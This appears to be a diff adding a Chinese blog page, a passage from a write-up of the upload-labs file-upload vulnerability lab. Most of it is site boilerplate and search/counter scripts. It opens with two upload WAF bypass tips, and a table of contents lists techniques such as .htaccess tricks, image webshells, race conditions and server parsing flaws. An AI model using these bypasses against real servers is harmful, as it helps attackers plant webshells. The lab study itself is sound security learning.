file\nname=&quot;php.php&quot;</span><br><span class="line">29. head头content-type空格:</span><br><span class="line">30. form-data字段与name字段交换位置</span><br></pre></td></tr></table></figure>
+          
+          <div>    
+ 
+ 
+    <div class="post-copyright">
+    	如果文章有问题欢迎指出,或者你也可以联系我
+      <div class="post-copyright-author">
+          <strong>本文作者：</strong>E1se
+      </div>
+      <div class="post-copyright-link">
+        <strong>本文链接：</strong>
+        <a href="/2019/02/13/upload-labs-练习/" title="upload labs 练习">2019/02/13/upload-labs-练习/</a>
+      </div>
+      <div class="post-copyright-license">
+        <strong>版权声明： </strong>
+        本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0 CN</a> 许可协议。转载请注明出处！
+      </div>
+    </div>
+  
+</div>
+    </div>
+
+    
+    
+    
+
+    
+
+    
+
+    
+	
+	<div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束-------------</div>
+    
+</div>
+  
+	</div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/文件上传/" rel="tag"> <i class="fa fa-tag"></i>文件上传</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/28/myeclips-无法使用工作空间问题/" rel="next" title="myeclips 无法使用工作空间问题">
+                <i class="fa fa-chevron-left"></i> myeclips 无法使用工作空间问题
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/02/20/Win-优化&技巧以及其他/" rel="prev" title="Win 优化&技巧以及其他">
+                Win 优化&技巧以及其他 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/eva1.ico"
+                alt="E1se" />
+            
+              <p class="site-author-name" itemprop="name">E1se</p>
+              <p class="site-description motion-element" itemprop="description">none</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">27</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/e1sewhere" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="elsewhere997@163.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                推荐站点
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://e1sewhere.github.io/EdenPage/11111/" title="什么也没有" target="_blank">什么也没有</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.ruanyifeng.com/blog/" title="阮一峰的网络日志" target="_blank">阮一峰的网络日志</a>
+                  </li>
+                
+              </ul>
+			<div id="days"></div>
+</script>
+<script language="javascript">
+function show_date_time(){
+window.setTimeout("show_date_time()", 1000);
+BirthDay=new Date("02/20/2018 15:00:00");
+today=new Date();
+timeold=(today.getTime()-BirthDay.getTime());
+sectimeold=timeold/1000
+secondsold=Math.floor(sectimeold);
+msPerDay=24*60*60*1000
+e_daysold=timeold/msPerDay
+daysold=Math.floor(e_daysold);
+e_hrsold=(e_daysold-daysold)*24;
+hrsold=setzero(Math.floor(e_hrsold));
+e_minsold=(e_hrsold-hrsold)*60;
+minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+seconds=setzero(Math.floor((e_minsold-minsold)*60));
+document.getElementById('days').innerHTML="已运行"+daysold+"天"+hrsold+"小时"+minsold+"分"+seconds+"秒";
+}
+function setzero(i){
+if (i<10)
+{i="0" + i};
+return i;
+}
+show_date_time();
+</script>
+  
+            </div>
+          
+
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#没有解决的pass"><span class="nav-number">1.</span> <span class="nav-text">没有解决的pass</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#upload漏洞粗略了解"><span class="nav-number">2.</span> <span class="nav-text">upload漏洞粗略了解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#upload类型"><span class="nav-number">2.1.</span> <span class="nav-text">upload类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#判断upload"><span class="nav-number">2.2.</span> <span class="nav-text">判断upload</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考过的比较好的writup"><span class="nav-number">4.</span> <span class="nav-text">参考过的比较好的writup</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WritUp"><span class="nav-number">5.</span> <span class="nav-text">WritUp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-01-客户端后缀检查"><span class="nav-number">5.1.</span> <span class="nav-text">pass 01 客户端后缀检查</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#方法一-firefox-开发者工具直接修改-待查"><span class="nav-number">5.1.1.</span> <span class="nav-text">方法一 firefox 开发者工具直接修改 待查?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法二-禁用js"><span class="nav-number">5.1.2.</span> <span class="nav-text">方法二 禁用js</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法三-burp改包"><span class="nav-number">5.1.3.</span> <span class="nav-text">方法三 burp改包</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass2-服务端mime检查"><span class="nav-number">5.2.</span> <span class="nav-text">pass2 服务端mime检查</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass3-服务端黑名单"><span class="nav-number">5.3.</span> <span class="nav-text">pass3 服务端黑名单 ???</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#方法一-直接绕过"><span class="nav-number">5.3.1.</span> <span class="nav-text">方法一 直接绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法二-htaccess文件上传解析漏洞-（重写解析规则绕过）"><span class="nav-number">5.3.2.</span> <span class="nav-text">方法二 htaccess文件上传解析漏洞 （重写解析规则绕过）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#原理"><span class="nav-number">5.3.2.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#上传"><span class="nav-number">5.3.2.2.</span> <span class="nav-text">上传</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass4-服务端黑名单检查"><span class="nav-number">5.4.</span> <span class="nav-text">pass4 服务端黑名单检查</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#方法一"><span class="nav-number">5.4.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法二"><span class="nav-number">5.4.2.</span> <span class="nav-text">方法二</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass5"><span class="nav-number">5.5.</span> <span class="nav-text">pass5</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#双写绕过"><span class="nav-number">5.5.1.</span> <span class="nav-text">双写绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass6"><span class="nav-number">5.6.</span> <span class="nav-text">pass6</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#加空绕过"><span class="nav-number">5.6.1.</span> <span class="nav-text">加空绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass7-后缀加点绕过"><span class="nav-number">5.7.</span> <span class="nav-text">pass7 后缀加点绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass8-DATA绕过"><span class="nav-number">5.8.</span> <span class="nav-text">pass8 ::$DATA绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass9"><span class="nav-number">5.9.</span> <span class="nav-text">pass9</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass10"><span class="nav-number">5.10.</span> <span class="nav-text">pass10</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#后缀双写"><span class="nav-number">5.10.1.</span> <span class="nav-text">后缀双写</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass11"><span class="nav-number">5.11.</span> <span class="nav-text">pass11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass12"><span class="nav-number">5.12.</span> <span class="nav-text">pass12</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass13"><span class="nav-number">5.13.</span> <span class="nav-text">pass13</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#制作图片马"><span class="nav-number">5.13.1.</span> <span class="nav-text">制作图片马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#制作文件包含入口"><span class="nav-number">5.13.2.</span> <span class="nav-text">制作文件包含入口</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass14"><span class="nav-number">5.14.</span> <span class="nav-text">pass14</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass15"><span class="nav-number">5.15.</span> <span class="nav-text">pass15</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass16"><span class="nav-number">5.16.</span> <span class="nav-text">pass16</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass17"><span class="nav-number">5.17.</span> <span class="nav-text">pass17</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#方法一-1"><span class="nav-number">5.17.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法二-条件竞争"><span class="nav-number">5.17.2.</span> <span class="nav-text">方法二 条件竞争</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#演示"><span class="nav-number">5.17.2.1.</span> <span class="nav-text">演示</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分析"><span class="nav-number">5.17.2.2.</span> <span class="nav-text">分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass18"><span class="nav-number">5.18.</span> <span class="nav-text">pass18</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#upload-bypass"><span class="nav-number">6.</span> <span class="nav-text">upload bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#waf检测范围"><span class="nav-number">6.1.</span> <span class="nav-text">waf检测范围</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#容器特性"><span class="nav-number">6.2.</span> <span class="nav-text">容器特性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#apache1-x-2-x文件后缀解析漏洞"><span class="nav-number">6.2.1.</span> <span class="nav-text">apache1.x 2.x文件后缀解析漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ISS6-0解析缺陷"><span class="nav-number">6.2.2.</span> <span class="nav-text">ISS6.0解析缺陷</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Nginx解析漏洞"><span class="nav-number">6.2.3.</span> <span class="nav-text">Nginx解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Nginx-0-8-lt-0-8-37"><span class="nav-number">6.2.3.1.</span> <span class="nav-text">Nginx 0.8 &lt;= 0.8.37</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Nginx-0-8-41-–-1-5-6："><span class="nav-number">6.2.3.2.</span> <span class="nav-text">Nginx 0.8.41 – 1.5.6：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP-CGI解析漏洞"><span class="nav-number">6.2.4.</span> <span class="nav-text">PHP CGI解析漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#多个Content-Disposition"><span class="nav-number">6.2.5.</span> <span class="nav-text">多个Content-Disposition</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#结合-htaccess"><span class="nav-number">6.2.6.</span> <span class="nav-text">结合.htaccess</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#系统特性"><span class="nav-number">6.3.</span> <span class="nav-text">系统特性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#windows特殊字符"><span class="nav-number">6.3.1.</span> <span class="nav-text">windows特殊字符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exee扩展名"><span class="nav-number">6.3.2.</span> <span class="nav-text">exee扩展名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTFS-ADS特性"><span class="nav-number">6.3.3.</span> <span class="nav-text">NTFS ADS特性</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#数据过长导致的绕过"><span class="nav-number">6.4.</span> <span class="nav-text">数据过长导致的绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wafbypass-upload一些总结绕过"><span class="nav-number">6.5.</span> <span class="nav-text">wafbypass_upload一些总结绕过</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">E1se</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+	
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">52.0k</span>
+  
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_pv">
+  本站访客数:<span id="busuanzi_value_site_pv"></span>|
+</span>
+</div>
+
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://Elsewhere.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://e1sewhere.github.io/2019/02/13/upload-labs-练习/';
+          this.page.identifier = '2019/02/13/upload-labs-练习/';
+          this.page.title = 'upload labs 练习';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://Elsewhere.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("RdoHhlfsod7gkQO5TbaSheUY-gzGzoHsz", "9wRib5jaIuQL2dVmtXx24smG");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
